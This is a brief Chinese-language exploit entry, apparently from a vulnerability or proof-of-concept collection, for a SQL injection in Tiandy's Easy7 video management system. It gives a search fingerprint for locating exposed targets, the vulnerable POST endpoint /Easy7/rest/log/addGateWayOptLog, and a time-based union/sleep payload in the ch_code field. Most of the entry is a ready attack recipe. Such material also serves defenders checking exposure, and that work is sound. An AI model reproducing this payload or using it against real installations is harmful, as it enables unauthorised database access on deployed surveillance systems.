# 天地伟业Easy7addGateWayOptLog存在SQL注入漏洞

天地伟业 ｜ SQL注入 ｜ —
- **指纹**：`app="Tiandy-Easy7"`
- **请求**：`POST /Easy7/rest/log/addGateWayOptLog HTTP/1.1`

**Payload**
```
gateLog={"gateLogList":[{"ch_code":"1'union select sleep(3)--+","ch_caption":"1","dt_time":"1"}]}
```
- **响应特征**：200